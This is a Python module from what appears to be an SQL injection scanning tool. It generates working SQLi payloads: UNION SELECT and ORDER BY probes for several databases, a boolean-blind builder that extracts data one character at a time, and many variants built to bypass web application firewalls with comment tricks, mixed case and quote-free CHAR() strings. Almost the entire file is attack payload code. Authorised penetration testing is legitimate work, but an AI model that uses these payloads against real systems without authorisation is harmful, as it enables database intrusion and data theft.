# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
UNION-based probes and string/substring helper payloads.
"""
from __future__ import annotations

import random
import string
from typing import List

BREACH_MARKER_PREFIX = "BreachSQL_"


def make_marker() -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{BREACH_MARKER_PREFIX}{suffix}"


# ---------------------------------------------------------------------------
# String concatenation probes
# Used to confirm SQLi by verifying the DB can concatenate strings.
# ---------------------------------------------------------------------------

CONCAT_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        # CONCAT() function — reflects 'foobar' if evaluated
        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
        "' UNION SELECT CONCAT(0x666f6f,0x626172),NULL-- -",  # hex-encoded
    ],
    "mariadb": [
        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
    ],
    "mssql": [
        # + operator for string concat
        "' AND 1=1 AND 'foo'+'bar'='foobar'-- -",
        "' UNION SELECT 'foo'+'bar',NULL-- -",
        "'; SELECT 'foo'+'bar'-- -",
    ],
    "postgres": [
        # || operator
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL-- -",
    ],
    "sqlite": [
        # || operator
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL-- -",
    ],
    "oracle": [
        # || operator, dual table required
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL FROM dual-- -",
    ],
    "auto": [
        # Try generic forms that work across most DBMSes
        "' AND CONCAT('foo','bar')='foobar'-- -",
        "' AND 'foo'||'bar'='foobar'-- -",
        "' AND 'foo'+'bar'='foobar'-- -",
    ],
}

# ---------------------------------------------------------------------------
# Substring probes (used in blind data extraction)
# ---------------------------------------------------------------------------

SUBSTRING_PROBES: dict[str, List[str]] = {
    "mysql": [
        # SUBSTRING('foobar', 4, 2) = 'ba'
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
        "' AND MID('foobar',4,2)='ba'-- -",
    ],
    "mariadb": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "mssql": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "postgres": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "sqlite": [
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
    "oracle": [
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
    "auto": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
}


def get_concat_payloads(dbms: str) -> List[str]:
    """Return string concatenation probe payloads for *dbms*."""
    return CONCAT_PAYLOADS.get(dbms, CONCAT_PAYLOADS["auto"])


def get_substring_probes(dbms: str) -> List[str]:
    """Return substring probe payloads for *dbms*."""
    return SUBSTRING_PROBES.get(dbms, SUBSTRING_PROBES["auto"])


def make_substring_payload(dbms: str, expr: str, pos: int, char: str) -> str:
    """
    Build a boolean-blind payload that checks whether the character at position
    *pos* (1-based) in the SQL expression *expr* equals *char*.
    """
    substr_fn = "SUBSTR" if dbms in ("sqlite", "oracle") else "SUBSTRING"
    char_hex = hex(ord(char))  # e.g. 0x41 for 'A'
    # Use ASCII()/ORD() to avoid quoting issues with special chars
    ord_fn = "ASCII" if dbms in ("mysql", "mariadb", "mssql", "sqlite") else "ASCII"
    if dbms == "postgres":
        ord_fn = "ASCII"
    return f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))={ord(char)}-- -"


def order_by_probes(max_cols: int = 20) -> List[str]:
    """
    Generate ORDER BY N probes to determine column count.

    Six variants are emitted for each column count, covering SQL injection
    contexts:

    - String context (``'`` prefix): used when the param value is quoted
    - Single-paren escape (``')`` prefix): covers ``WHERE x = ('val')``
    - Double-paren escape (``'))`` prefix): covers ``WHERE x LIKE ('%val%')``
    - Numeric context (no prefix): used when the param is bare numeric
    - Two comment terminators each: ``-- -`` (ANSI) and ``#`` (MySQL)

    The probes are interleaved so the scanner tries all context styles before
    advancing to N+1 — allowing early termination on whatever context matches.
    """
    probes = []
    for n in range(1, max_cols + 1):
        probes.append(f"' ORDER BY {n}-- -")
        probes.append(f"' ORDER BY {n}#")
        probes.append(f"') ORDER BY {n}-- -")    # single-paren context
        probes.append(f"') ORDER BY {n}#")
        probes.append(f"')) ORDER BY {n}-- -")   # double-paren / LIKE context
        probes.append(f"')) ORDER BY {n} --")    # space before -- (SQLite style)
        probes.append(f" ORDER BY {n}-- -")      # numeric context
        probes.append(f" ORDER BY {n}#")         # numeric context, MySQL hash
        probes.append(f"' GROUP BY {n}-- -")
        probes.append(f"' /**/ORDER/**/BY/**/ {n}-- -")
        probes.append(f"' /*!ORDER BY*/ {n}-- -")
        probes.append(f"'/*!50000ORDER*//**//*!50000BY*/ {n}-- -")
        probes.append(f"' order/**_**/by {n}-- -")
        probes.append(f"' AND 0 order by {n}-- -")
        probes.append(f"%0Aorder%0Aby%0A{n}-- -")
        probes.append(f"%23%0Aorder%23%0Aby%23%0A{n}-- -")
    return probes


def _marker_to_char_expr(marker: str) -> str:
    """Convert a marker string to a CHAR()/char() expression (quote-free).

    Works for both MySQL CHAR() and SQLite char().  The expression produces
    the marker string without using any single-quote characters, bypassing
    naive WAFs that strip quotes.
    """
    return "char(" + ",".join(str(ord(c)) for c in marker) + ")"


def union_null_probes(col_count: int, marker: str) -> List[str]:
    """
    Generate UNION SELECT probes for a known column count.

    For each column position, variants covering string context, numeric context,
    paren-escape contexts, WAF-bypass comment styles, and quote-free CHAR()
    expressions are generated.
    """
    char_marker = _marker_to_char_expr(marker)
    payloads = []
    for pos in range(col_count):
        # String literal marker (works for MySQL, SQLite)
        cols_str = ["NULL"] * col_count
        cols_str[pos] = f"'{marker}'"
        # CAST marker (works for PostgreSQL, MSSQL where column is typed)
        cols_cast = ["NULL"] * col_count
        cols_cast[pos] = f"CAST('{marker}' AS CHAR)"
        # Integer-padded variant: non-marker columns use sequential integers
        cols_int = [str(i + 1) for i in range(col_count)]
        cols_int[pos] = f"'{marker}'"
        # Quote-free CHAR() variant: bypasses WAFs that strip single-quotes
        cols_char = ["NULL"] * col_count
        cols_char[pos] = char_marker

        for cols in (cols_str, cols_cast, cols_int, cols_char):
            inner = ",".join(cols)
            # String context
            payloads.append(f"' UNION SELECT {inner}-- -")
            payloads.append(f"' UNION SELECT {inner}#")
            # Numeric context
            payloads.append(f" UNION SELECT {inner}-- -")
            payloads.append(f" UNION SELECT {inner}#")
            # Paren-escape contexts
            payloads.append(f"') UNION SELECT {inner}-- -")
            payloads.append(f"') UNION SELECT {inner}#")
            payloads.append(f"')) UNION SELECT {inner}-- -")
            payloads.append(f"')) UNION SELECT {inner}#")
            payloads.append(f"' UNION ALL SELECT {inner}-- -")
            payloads.append(f"' Union Distinctrow Select {inner}-- -")
            payloads.append(f"' /*!50000UNION SELECT*/ {inner}-- -")
            payloads.append(f"' /*!50000UniON SeLeCt*/ {inner}-- -")
            payloads.append(f"' AnD null UNiON SeLeCt {inner}-- -")
            payloads.append(f"' And False Union Select {inner}-- -")
            payloads.append(f"' /**/uNIon/**/sEleCt/**/ {inner}-- -")
            payloads.append(f"' union /*!50000%53elect*/ {inner}-- -")
    return payloads
